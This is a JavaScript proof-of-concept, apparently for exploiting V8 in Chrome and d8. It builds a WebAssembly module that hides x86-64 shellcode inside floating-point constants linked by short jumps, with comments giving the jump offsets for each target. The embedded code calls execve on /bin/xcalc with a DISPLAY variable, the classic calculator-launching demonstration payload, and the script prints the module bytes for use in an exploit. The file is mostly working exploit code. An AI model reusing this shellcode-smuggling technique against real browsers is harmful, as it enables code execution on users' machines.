d8.file.execute("/home/mmo/chrome_pocs/v8_test/wasm/wasm-module-builder.js");

const importObject = {
  imports: { imported_func : Math.sin},
};


var builder = new WasmModuleBuilder();
let array = builder.addArray(kWasmF64, true);

var sig_index = builder.addType(kSig_d_d);

builder.addImport("imports", "imported_func", sig_index);
builder.addFunction("main", sig_index)
       .addBody([kExprLocalGet, 0, kExprCallFunction, 0])
       .exportAs("main");
//jumps: 0x45, 0x48 for d8
//0x1d, 0x20 for chrome
builder.addFunction("make_array", makeSig([], [wasmRefNullType(array)]))
         .addLocals(wasmRefNullType(array), 1)
         .addBody([kExprI32Const, 18, kGCPrefix, kExprArrayNewDefault, array, kExprLocalSet, 0,
                   kExprLocalGet, 0,
                   kExprI32Const, 0,
                   kExprF64Const, 0x31, 0xf6, 0x31, 0xd2, 0x31, 0xc0, 0xeb, 0x1d,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 1,
                   kExprF64Const, 0x68, 0x6c, 0x63, 0x00, 0x00, 0x90, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 2,
                   kExprF64Const, 0x68, 0x2f, 0x78, 0x63, 0x61, 0x58, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 3,
                   kExprF64Const, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x5b, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 4,
                   kExprF64Const, 0x90, 0x90, 0x48, 0xc1, 0xe0, 0x20, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 5,
                   kExprF64Const, 0x48, 0x01, 0xd8, 0x50, 0x54, 0x5f, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 6,
                   kExprF64Const, 0x56, 0x57, 0x54, 0x5e, 0x90, 0x90, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 7,
                   kExprF64Const, 0x68, 0x3a, 0x30, 0x2e, 0x30, 0x90, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 8,
                   kExprF64Const, 0x68, 0x4c, 0x41, 0x59, 0x3d, 0x58, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 9,
                   kExprF64Const, 0x68, 0x44, 0x49, 0x53, 0x50, 0x5b, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 10,
                   kExprF64Const, 0x90, 0x48, 0xc1, 0xe0, 0x20, 0x90, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 11,
                   kExprF64Const, 0x48, 0x01, 0xd8, 0x50, 0x54, 0x90, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 12,
                   kExprF64Const, 0x41, 0x5a, 0x52, 0x41, 0x52, 0x54, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 13,
                   kExprF64Const, 0x5a, 0xb8, 0x3b, 0x00, 0x00, 0x00, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0,
                   kExprI32Const, 14,
                   kExprF64Const, 0x0f, 0x05, 0x5a, 0x31, 0xd2, 0x52, 0xeb, 0x20,
                   kGCPrefix, kExprArraySet, array,
                   kExprLocalGet, 0])
         .exportFunc();

var wasmBuffer = builder.toBuffer(false);
var bufStr = '['
for (let i = 0; i < wasmBuffer.length - 1; i++) {
  bufStr += wasmBuffer[i] + ',';
}
bufStr += wasmBuffer[wasmBuffer.length - 1] + ']';
console.log(bufStr);
